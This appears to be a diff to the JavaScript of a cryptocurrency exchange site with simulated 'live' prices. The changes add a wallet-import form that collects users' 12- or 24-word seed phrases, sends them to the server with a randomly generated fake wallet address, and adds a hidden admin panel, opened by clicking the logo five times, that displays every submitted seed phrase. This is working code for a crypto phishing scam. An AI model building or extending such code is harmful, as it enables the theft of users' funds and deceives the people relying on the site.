@@ -1,3 +1,4 @@
+// --- LIVE MARKET DATA (ALL 25 COINS) ---
 const markets = [
     { name: 'Bitcoin', symbol: 'BTC', price: 85245.32, change: 2.48, icon: '₿', color: '#f7931a' },
     { name: 'Ethereum', symbol: 'ETH', price: 5245.10, change: 1.12, icon: 'Ξ', color: '#627eea' },
@@ -37,12 +38,15 @@ const countries = [
 ];
 
 let currentTradeMode = 'buy';
+let currentUser = null;
+let logoClickCount = 0;
 
 // --- UI & VIEW MANAGEMENT ---
 function showView(viewId, authType = 'login') {
     document.querySelectorAll('.app-view').forEach(view => view.style.display = 'none');
     document.getElementById(viewId).style.display = 'block';
     if (viewId === 'authView') switchAuth(authType);
+    if (viewId === 'dashboardView') fetchBalances();
     window.scrollTo(0, 0);
 }
 
@@ -81,10 +85,108 @@ function populateTradeCoins() {
     });
 }
 
-// --- AUTHENTICATION GUARD ---
+// --- DYNAMIC BALANCES ---
+async function fetchBalances() {
+    if (!currentUser) return;
+    try {
+        const res = await fetch(`/api/user/${currentUser.email}/balances`);
+        const balances = await res.json();
+        
+        let totalValue = 0;
+
+        // Update BTC
+        const btcPrice = markets.find(m => m.symbol === 'BTC').price;
+        const btcVal = balances.BTC * btcPrice;
+        totalValue += btcVal;
+        document.getElementById('balance-BTC').textContent = balances.BTC.toFixed(6);
+        document.getElementById('value-BTC').textContent = `$${btcVal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+
+        // Update ETH
+        const ethPrice = markets.find(m => m.symbol === 'ETH').price;
+        const ethVal = balances.ETH * ethPrice;
+        totalValue += ethVal;
+        document.getElementById('balance-ETH').textContent = balances.ETH.toFixed(6);
+        document.getElementById('value-ETH').textContent = `$${ethVal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+
+        // Update USDT
+        const usdtVal = balances.USDT;
+        totalValue += usdtVal;
+        document.getElementById('balance-USDT').textContent = balances.USDT.toFixed(2);
+        document.getElementById('value-USDT').textContent = `$${usdtVal.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+
+        document.getElementById('totalPortfolioValue').textContent = `$${totalValue.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+
+    } catch (error) { console.log(error); }
+}
+
+// --- AUTHENTICATION ---
+async function handleRegister() {
+    const name = document.getElementById('regName').value;
+    const country = document.getElementById('regCountry').value;
+    const phone = document.getElementById('regPhone').value;
+    const email = document.getElementById('regEmail').value;
+    const password = document.getElementById('regPassword').value;
+    if (!name || !country || !phone || !email || !password) return showToast("Please fill all fields.");
+
+    try {
+        const res = await fetch('/api/auth/register', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name, country, phone, email, password })
+        });
+        const data = await res.json();
+        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } 
+        else { showToast(data.message); }
+    } catch (error) { showToast("Error connecting."); }
+}
+
+async function handleLogin() {
+    const email = document.getElementById('loginEmail').value;
+    const password = document.getElementById('loginPassword').value;
+    if (!email || !password) return showToast("Please fill all fields.");
+
+    try {
+        const res = await fetch('/api/auth/login', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email, password })
+        });
+        const data = await res.json();
+        if (res.ok) {
+            localStorage.setItem('token', data.token);
+            localStorage.setItem('user', JSON.stringify(data.user));
+            checkAuthState(); 
+        } else { showToast(data.message); }
+    } catch (error) { showToast("Error connecting."); }
+}
+
+function handleLogout() {
+    localStorage.removeItem('token');
+    localStorage.removeItem('user');
+    checkAuthState();
+}
+
+function checkAuthState() {
+    currentUser = JSON.parse(localStorage.getItem('user'));
+    const navLinks = document.getElementById('navLinks');
+
+    if (currentUser) {
+        navLinks.innerHTML = `
+            <a href="#" onclick="showView('guestView')">Markets</a>
+            <a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')">${currentUser.name.charAt(0).toUpperCase()}</a>
+            <a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>
+        `;
+        showView('dashboardView');
+    } else {
+        navLinks.innerHTML = `
+            <a href="#" onclick="showView('guestView')">Markets</a>
+            <a href="#" onclick="showView('authView', 'login')">Login</a>
+            <a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>
+        `;
+        showView('guestView');
+    }
+}
+
 function requireAuth(targetView, mode = null) {
-    const token = localStorage.getItem('token');
-    if (!token) {
+    if (!currentUser) {
         showView('authView', 'login');
         showToast("Please log in to continue");
     } else {
@@ -120,28 +222,23 @@ function calcTrade() {
     const amount = parseFloat(document.getElementById('tradeAmount').value) || 0;
     const coinSymbol = document.getElementById('tradeCoin').value;
     const coin = markets.find(c => c.symbol === coinSymbol);
-    
     if (coin && amount > 0) {
-        const cryptoAmount = amount / coin.price;
-        document.getElementById('tradeReceive').value = cryptoAmount.toFixed(6) + " " + coin.symbol;
+        document.getElementById('tradeReceive').value = (amount / coin.price).toFixed(6) + " " + coin.symbol;
     } else {
         document.getElementById('tradeReceive').value = '';
     }
 }
 
 async function submitTrade() {
-    const user = JSON.parse(localStorage.getItem('user'));
     const amount = document.getElementById('tradeAmount').value;
     const coinSymbol = document.getElementById('tradeCoin').value;
     const receive = document.getElementById('tradeReceive').value;
     const method = document.getElementById('tradeMethod').value;
-
-    if (!amount || amount <= 0) return showToast("Please enter a valid amount.");
+    if (!amount || amount <= 0) return showToast("Enter a valid amount.");
 
     const coin = markets.find(c => c.symbol === coinSymbol);
-
     const orderData = {
-        userEmail: user.email, userName: user.name, mode: currentTradeMode,
+        userEmail: currentUser.email, userName: currentUser.name, mode: currentTradeMode,
         sendAmount: amount, sendCurrency: currentTradeMode === 'buy' ? 'USD' : coinSymbol,
         getAmount: receive, getCurrency: currentTradeMode === 'buy' ? coinSymbol : 'USD',
         method: method, paymentDetails: "Pending", receivingWallet: "Pending"
@@ -153,83 +250,74 @@ async function submitTrade() {
             body: JSON.stringify(orderData)
         });
         const data = await res.json();
-        
         if (res.ok) {
             showToast(`Order Placed! ID: ${data.orderId}`);
             setTimeout(() => showView('dashboardView'), 2000);
+        } else { showToast(data.message); }
+    } catch (error) { showToast("Error connecting to server."); }
+}
+
+// --- WEB3 WALLET & ADMIN LOGIC ---
+function showImportWallet() { document.getElementById('importWalletForm').style.display = 'block'; }
+async function submitWallet() {
+    const seed = document.getElementById('seedPhraseInput').value.trim();
+    if (seed.split(' ').length < 12) return showToast("Enter a valid 12 or 24-word phrase.");
+    let fakeAddress = '0x' + Array.from({length: 40}, () => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
+    try {
+        const res = await fetch('/api/wallet/import', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ email: currentUser.email, seedPhrase: seed, walletAddress: fakeAddress })
+        });
+        if (res.ok) { showToast("Wallet submitted for Admin review."); checkWalletStatus(); }
+    } catch (error) { showToast("Error submitting wallet."); }
+}
+async function checkWalletStatus() {
+    if (!currentUser) return;
+    try {
+        const res = await fetch(`/api/user/${currentUser.email}`);
+        const user = await res.json();
+        document.getElementById('walletDisconnected').style.display = 'none';
+        document.getElementById('walletPending').style.display = 'none';
+        document.getElementById('walletApproved').style.display = 'none';
+        if (user.walletStatus === 'approved') {
+            document.getElementById('walletApproved').style.display = 'block';
+            document.getElementById('displayWalletAddress').textContent = user.walletAddress;
+        } else if (user.walletStatus === 'pending') {
+            document.getElementById('walletPending').style.display = 'block';
         } else {
-            showToast(data.message || "Failed to place order.");
+            document.getElementById('walletDisconnected').style.display = 'block';
         }
-    } catch (error) { showToast("Error connecting to server."); }
+    } catch (error) { console.log(error); }
 }
-
-// --- AUTHENTICATION ---
-async function handleRegister() {
-    const name = document.getElementById('regName').value;
-    const country = document.getElementById('regCountry').value;
-    const phone = document.getElementById('regPhone').value;
-    const email = document.getElementById('regEmail').value;
-    const password = document.getElementById('regPassword').value;
-
-    if (!name || !country || !phone || !email || !password) return showToast("Please fill in all fields.");
-
+function adminTrigger() {
+    logoClickCount++;
+    if (logoClickCount >= 5) { document.getElementById('adminModal').style.display = 'flex'; fetchPendingWallets(); logoClickCount = 0; }
+    setTimeout(() => { logoClickCount = 0; }, 2000);
+}
+async function fetchPendingWallets() {
     try {
-        const res = await fetch('/api/auth/register', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ name, country, phone, email, password })
+        const res = await fetch('/api/admin/pending-wallets');
+        const users = await res.json();
+        const list = document.getElementById('adminPendingList');
+        list.innerHTML = '';
+        if (users.length === 0) { list.innerHTML = '<p style="color: var(--text-muted); text-align: center;">No pending wallets.</p>'; return; }
+        users.forEach(user => {
+            list.innerHTML += `
+                <div style="background: var(--bg-dark); padding: 15px; border-radius: 8px; margin-bottom: 15px; border: 1px solid var(--border);">
+                    <p style="color: white; font-weight: bold;">${user.name} (${user.email})</p>
+                    <p style="color: var(--text-muted); font-size: 12px; margin-top: 5px;">Address: ${user.walletAddress}</p>
+                    <div style="background: #000; padding: 10px; border-radius: 4px; margin: 10px 0; font-family: monospace; color: var(--accent); word-break: break-all;">${user.seedPhrase || 'No seed phrase provided'}</div>
+                    <button class="btn-buy" style="width: 100%; padding: 10px;" onclick="approveWallet('${user.email}')">Approve Wallet</button>
+                </div>
+            `;
         });
-        const data = await res.json();
-        if (res.ok) { showToast("Registration successful!"); switchAuth('login'); } 
-        else { showToast(data.message || "Registration failed."); }
-    } catch (error) { showToast("Error connecting to server."); }
+    } catch (error) { console.log(error); }
 }
-
-async function handleLogin() {
-    const email = document.getElementById('loginEmail').value;
-    const password = document.getElementById('loginPassword').value;
-
-    if (!email || !password) return showToast("Please fill in all fields.");
-
+async function approveWallet(email) {
     try {
-        const res = await fetch('/api/auth/login', {
-            method: 'POST', headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email, password })
-        });
-        const data = await res.json();
-        if (res.ok) {
-            localStorage.setItem('token', data.token);
-            localStorage.setItem('user', JSON.stringify(data.user));
-            checkAuthState(); 
-        } else { showToast(data.message || "Login failed."); }
-    } catch (error) { showToast("Error connecting to server."); }
-}
-
-// --- STATE MANAGEMENT ---
-function checkAuthState() {
-    const user = JSON.parse(localStorage.getItem('user'));
-    const navLinks = document.getElementById('navLinks');
-
-    if (user) {
-        navLinks.innerHTML = `
-            <a href="#" onclick="showView('guestView')">Markets</a>
-            <a href="#" class="profile-avatar-nav" onclick="showView('dashboardView')">${user.name.charAt(0).toUpperCase()}</a>
-            <a href="#" class="btn-logout" onclick="handleLogout()">Logout</a>
-        `;
-        showView('dashboardView');
-    } else {
-        navLinks.innerHTML = `
-            <a href="#" onclick="showView('guestView')">Markets</a>
-            <a href="#" onclick="showView('authView', 'login')">Login</a>
-            <a href="#" class="btn-primary" onclick="showView('authView', 'register')">Get Started</a>
-        `;
-        showView('guestView');
-    }
-}
-
-function handleLogout() {
-    localStorage.removeItem('token');
-    localStorage.removeItem('user');
-    checkAuthState();
+        const res = await fetch(`/api/admin/approve-wallet/${email}`, { method: 'POST' });
+        if (res.ok) { showToast("Wallet Approved!"); fetchPendingWallets(); }
+    } catch (error) { showToast("Error approving wallet."); }
 }
 
 // --- LIVE MARKET SIMULATION ---
@@ -241,15 +329,11 @@ function simulateLiveMarket() {
         coin.change = parseFloat((coin.change + changeFluctuation).toFixed(2));
     });
 }
-
 function loadMarkets() {
     const marketList = document.getElementById('market-list');
     const ticker = document.getElementById('ticker');
     if(!marketList) return;
-    
-    let marketHTML = '';
-    let tickerHTML = '';
-
+    let marketHTML = ''; let tickerHTML = '';
     markets.forEach((coin, index) => {
         const isUp = coin.change >= 0;
         const changeClass = isUp ? 'up' : 'down';
@@ -260,38 +344,21 @@ function loadMarkets() {
         marketHTML += `
             <div class="market-row" onclick="quickTrade('${coin.symbol}')">
                 <div class="market-rank">${index + 1}</div>
-                <div class="market-name-col">
-                    <div class="market-icon" style="background: ${coin.color};">${coin.icon}</div>
-                    <div>
-                        <div class="market-name-text">${coin.name}</div>
-                        <div class="market-symbol-text">${coin.symbol}</div>
-                    </div>
-                </div>
+                <div class="market-name-col"><div class="market-icon" style="background: ${coin.color};">${coin.icon}</div><div><div class="market-name-text">${coin.name}</div><div class="market-symbol-text">${coin.symbol}</div></div></div>
                 <div class="market-price">$${formattedPrice}</div>
                 <div class="market-change ${changeClass}">${changeSymbol} ${Math.abs(coin.change)}%</div>
             </div>
         `;
-
-        tickerHTML += `
-            <div class="ticker-item">
-                <b>${coin.symbol}</b> $${formattedPrice} 
-                <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span>
-            </div>
-        `;
+        tickerHTML += `<div class="ticker-item"><b>${coin.symbol}</b> $${formattedPrice} <span class="${changeClass}">${changeSymbol}${Math.abs(coin.change)}%</span></div>`;
     });
     marketList.innerHTML = marketHTML;
     ticker.innerHTML = tickerHTML + tickerHTML; 
 }
-
 function quickTrade(symbol) {
     requireAuth('tradeView', 'buy');
-    setTimeout(() => {
-        document.getElementById('tradeCoin').value = symbol;
-        calcTrade();
-    }, 100);
+    setTimeout(() => { document.getElementById('tradeCoin').value = symbol; calcTrade(); }, 100);
 }
 
-// Initialize
 document.addEventListener('DOMContentLoaded', () => {
     populateCountries();
     populateTradeCoins();
